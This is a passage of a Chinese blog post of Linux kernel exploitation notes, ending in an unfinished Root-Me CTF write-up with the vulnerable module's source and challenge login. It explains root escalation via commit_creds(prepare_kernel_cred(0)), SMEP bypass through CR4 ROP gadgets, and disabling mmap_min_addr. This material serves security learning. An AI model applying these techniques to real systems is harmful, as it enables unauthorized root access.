<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -m32 -static -o exp exp.c</span><br><span class="line">cp exp.c initramfs</span><br><span class="line">cp exp initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>

<h4 id="第二部分：vmlinux"><a href="#第二部分：vmlinux" class="headerlink" title="第二部分：vmlinux"></a>第二部分：vmlinux</h4><ul>
<li>bzImage：理解为压缩后的kernel文件</li>
<li>vmlinux：静态编译、未经过压缩</li>
</ul>
<p>若程序没有给vmlinux，给了bzImage，可以自行提取</p>
<p>在<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">网站</a>拷贝代码，命名为extract-vmlinux文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/linkern$ file vmlinux </span><br><span class="line">vmlinux: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, BuildID[sha1]=c5ad14eb97bda6a8093fa59483ca5ad055d69638, stripped</span><br></pre></td></tr></table></figure>

<h4 id="第三部分：查找LKMs模块基址"><a href="#第三部分：查找LKMs模块基址" class="headerlink" title="第三部分：查找LKMs模块基址"></a>第三部分：查找LKMs模块基址</h4><p>1.查找模块名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br><span class="line">#查看所有模块，模块名为basic1_ch1，得到基址.text基址：0xc8824000</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531150406602.png" alt="image-20210531150406602"></p>
<p>2.进入节区文件夹，访问<code>.text</code>、<code>.bss</code>、<code>.data</code></p>
<p>路径：<code>/sys/module/[模块名]/sections</code></p>
<p><img src="/2021/06/05/kernel-study/image-20210531150708860.png" alt="image-20210531150708860"></p>
<h4 id="第四部分：gdb"><a href="#第四部分：gdb" class="headerlink" title="第四部分：gdb"></a>第四部分：gdb</h4> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb vmlinux</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file lkms .text地址 (-s .bss .bss地址 -s .data .data地址)</span><br><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/tostring.ko 0xc8824000 -s .bss 0xc8824600 -s .data 0xc8824360</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote:1234	[启动文件里面-s默认端口是1234]</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531151735100.png" alt="image-20210531151735100"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#下断点，一般下在write、read上面</span><br><span class="line">b tostring_write</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531151809409.png" alt="image-20210531151809409"></p>
<h4 id="第五部分：执行qemu里的c程序"><a href="#第五部分：执行qemu里的c程序" class="headerlink" title="第五部分：执行qemu里的c程序"></a>第五部分：执行qemu里的c程序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;test</span><br><span class="line">#程序讲断在write函数上</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210531151832106.png" alt="image-20210531151832106"></p>
<hr>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>kernel 中有两个可以方便的改变权限的函数：</p>
<ul>
<li>int commit_creds(struct cred *new)</li>
<li>struct cred* prepare_kernel_cred(struct task_struct* daemon)</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><blockquote>
<p>root权限下，执行以下命令</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep commit_creds /proc/kallsyms </span><br><span class="line">grep prepare_kernel_cred /proc/kallsyms</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210602220742358.png" alt="image-20210602220742358"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void* (*prepare_kernel_cred)(void*) KERNCALL &#x3D; (void*) 0xC10711F0;</span><br><span class="line">void* (*commit_creds)(void*) KERNCALL &#x3D; (void*) 0xC1070E80;</span><br></pre></td></tr></table></figure>



<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>执行下面函数，从而将权限提升为root</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>iret返回到用户模式</li>
</ol>
<hr>
<h3 id="Bypass-SMEP"><a href="#Bypass-SMEP" class="headerlink" title="Bypass SMEP"></a>Bypass SMEP</h3><h4 id="绕过来由"><a href="#绕过来由" class="headerlink" title="绕过来由"></a>绕过来由</h4><p>smep是不允许处于内核态的时候执行用户态代码。</p>
<ul>
<li>之前如果没有开启smep，一般在提权成功后，在切换内核栈和用户栈时候，设置里面的寄存器值，使eip执行system(‘/bin/sh’)</li>
<li>如果开启了smep，则不允许这么做了，故想办法绕过smep，这样就能和之前一样的做法</li>
</ul>
<h4 id="smep原理"><a href="#smep原理" class="headerlink" title="smep原理"></a>smep原理</h4><p>内核是根据<code>CR4</code>寄存器的值来判断<code>smep</code>保护是否开启的</p>
<pre><code>* 当`CR4`寄存器的第`20`位是`1`时，保护开启
* 是`0`时，保护关闭。</code></pre><p>以下是<code>CR4</code>寄存器的各标志位：</p>
<p><img src="/2021/06/05/kernel-study/2020-03-18-072543.jpg" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
<p>因此，如果在内核中存在<code>gadget</code>能让我们修改<code>CR4</code>寄存器的值我们就可以手动来关闭<code>SMEP</code>保护了。</p>
<h4 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h4><ol>
<li><p>首先将bzImage解压出vmlinux</p>
</li>
<li><p>由于文件很大，gadget很多，故将gadget导入到一个文件中</p>
<p><code>ROPgadget --binary ./vmlinux &gt; gadgets</code></p>
</li>
<li><p>在文件中寻找可以控制cr4寄存器的gadget，如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xc10174fc : pop eax ; ret</span><br><span class="line">0xc1045053 : mov cr4, eax ; pop ebp ; ret</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><h4 id="1-mmap-min-addr"><a href="#1-mmap-min-addr" class="headerlink" title="1.mmap_min_addr"></a>1.mmap_min_addr</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/vm/mmap_min_addr</span><br></pre></td></tr></table></figure>

<p>解除了<code>mmap_min_addr</code>保护</p>
<p>因为最低可以映射到0，哪里都可以映射，相当于没限制了</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1"><a href="#1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1" class="headerlink" title="1.[Root-Me]LinKern x86 – Buffer overflow basic 1"></a>1.[Root-Me]LinKern x86 – Buffer overflow basic 1</h3><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch1@challenge03.root-me.org</span><br><span class="line"><span class="meta">#</span><span class="bash">password:app-systeme-ch1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/image-20210603142323422.png" alt="image-20210603142323422"></p>
<p>利用scp将文件拷贝倒本地</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch1@challenge03.root-me.org://challenge/app-systeme/ch1/* .</span><br><span class="line">scp -P 2223 ./poc.c app-systeme-ch1@challenge03.root-me.org://challenge/app-systeme/ch1/</span><br><span class="line"><span class="comment">#password:app-systeme-ch1</span></span><br></pre></td></tr></table></figure>

<h4 id="分析init"><a href="#分析init" class="headerlink" title="分析init"></a>分析init</h4><ol>
<li>解压</li>
<li>cat init</li>
</ol>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/linkern/initramfs$ cat init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">//提示flag在passwd，并且挂载到了/dev/sda</span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># share</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># module</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">//lkms加载到了/lib/modules/*/rootme/*.ko</span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/tostring </span><br><span class="line"><span class="comment"># mmap_min_addr to 0 for the challenge to be simpler for now ;)</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<ul>
<li>11、12行提示flag在passwd，并且挂载到了/dev/sda</li>
<li>25行中，需要分析的LKMs被加载到了<code>/lib/modules/*/rootme/*.ko</code></li>
</ul>
<h4 id="分析LKMs文件"><a href="#分析LKMs文件" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><p>进入<code>/lib/modules/*/rootme/*.ko</code>，找到LKMs文件</p>
<p><img src="/2021/06/05/kernel-study/image-20210603143340595.png" alt="image-20210603143340595"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/linkern/initramfs/lib/modules/4.10.3/rootme$ file tostring.ko </span><br><span class="line">tostring.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=de2b579770a3ff522ee27200d85cb2bc1723ef22, not stripped</span><br><span class="line">winter@ubuntu:~/linkern/initramfs/lib/modules/4.10.3/rootme$ checksec tostring.ko </span><br><span class="line">[*] '/home/winter/linkern/initramfs/lib/modules/4.10.3/rootme/tostring.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>（一般情况）加载到ida中分析，不过本程序给了源码，可以直接分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> first; <span class="comment">// Global variable for the first device number</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">c_dev</span>;</span> <span class="comment">// Global variable for the character device structure</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">class</span> *<span class="title">cl</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> pointer;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> tostring_stack[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">ssize_t</span> (*tostring_read)(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tostring_s</span> <span class="title">tostring</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_open</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: open()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">tostring_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: close()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read()\n"</span>);</span><br><span class="line">    <span class="keyword">return</span>(tostring.tostring_read)(f, buf, len, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_hexa</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read_hexa()\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (tostring.pointer &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%16llx\n"</span>,tostring.tostring_stack[--tostring.pointer]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_read_dec</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: read_dec()\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (tostring.pointer &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">snprintf</span>(buf,len,<span class="string">"%lld\n"</span>,tostring.tostring_stack[--tostring.pointer]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">tostring_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,<span class="keyword">size_t</span> len, <span class="keyword">loff_t</span> *off)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *bufk;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring: write()\n"</span>);</span><br><span class="line">    <span class="comment">// rajout du 0 final</span></span><br><span class="line"></span><br><span class="line">    bufk = kmalloc(len + <span class="number">1</span>, GFP_DMA);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bufk)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(bufk, buf, len))</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        bufk[len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bufk[<span class="number">0</span>]==<span class="string">'M'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bufk[<span class="number">1</span>]==<span class="string">'H'</span>) tostring.tostring_read= tostring_read_hexa;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (bufk[<span class="number">1</span>]==<span class="string">'D'</span>) tostring.tostring_read= tostring_read_dec;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            printk(<span class="string">"tostring: insertion %d\n"</span>,*((<span class="keyword">int</span> *) bufk));</span><br><span class="line">            tostring.tostring_stack[tostring.pointer++]= *((<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> *) bufk);;      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kfree(bufk);</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pugs_fops</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .<span class="built_in">open</span> = tostring_open,</span><br><span class="line">    .<span class="built_in">release</span> = tostring_close,</span><br><span class="line">    .<span class="built_in">read</span> = tostring_read,</span><br><span class="line">    .<span class="built_in">write</span> = tostring_write</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tostring_init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Constructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring registered"</span>);</span><br><span class="line">    tostring.pointer=<span class="number">0</span>;</span><br><span class="line">    tostring.tostring_read= tostring_read_hexa;</span><br><span class="line">    <span class="keyword">if</span> (alloc_chrdev_region(&amp;first, <span class="number">0</span>, <span class="number">1</span>, <span class="string">"tostring"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((cl = class_create(THIS_MODULE, <span class="string">"chardrv"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (device_create(cl, <span class="literal">NULL</span>, first, <span class="literal">NULL</span>, <span class="string">"tostring"</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"Tostring error"</span>);</span><br><span class="line">        class_destroy(cl);</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;c_dev, &amp;pugs_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;c_dev, first, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(cl, first);</span><br><span class="line">        class_destroy(cl);</span><br><span class="line">        unregister_chrdev_region(first, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"&lt;Major, Minor&gt;: &lt;%d, %d&gt;\n"</span>, MAJOR(first), MINOR(first));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">tostring_exit</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* Destructor */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    unregister_chrdev_region(first, <span class="number">3</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">"Tostring unregistered"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(tostring_init);</span><br><span class="line">module_exit(tostring_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"F.Boisson"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"Module Tostring Integers Dec/Hex"</span>);</span><br></pre></td></tr></table></figure>

<p>重点分析read和write函数</p>
<h5 id="read"><a href="#read" class="headerlink" title="read"></a>read</h5><ul>
<li><p>打印字符串<code>Tostring: read()\n</code></p>
</li>
<li><p>调用了0x8000984，参数是输入的数据</p>
<p><img src="/2021/06/05/kernel-study/image-20210603145537156.png" alt="image-20210603145537156"></p>
<p>0x8000984在bss段上，且上面有一个0x8000784、0x8000788</p>
<p><img src="/2021/06/05/kernel-study/image-20210603145615870.png" alt="image-20210603145615870"></p>
<p><img src="/2021/06/05/kernel-study/image-20210603145652475.png" alt="image-20210603145652475"></p>
</li>
</ul>
<h5 id="write"><a href="#write" class="headerlink" title="write"></a>write</h5><ul>
<li><p>打印字符串<code>Tostring: write()\n</code></p>
</li>
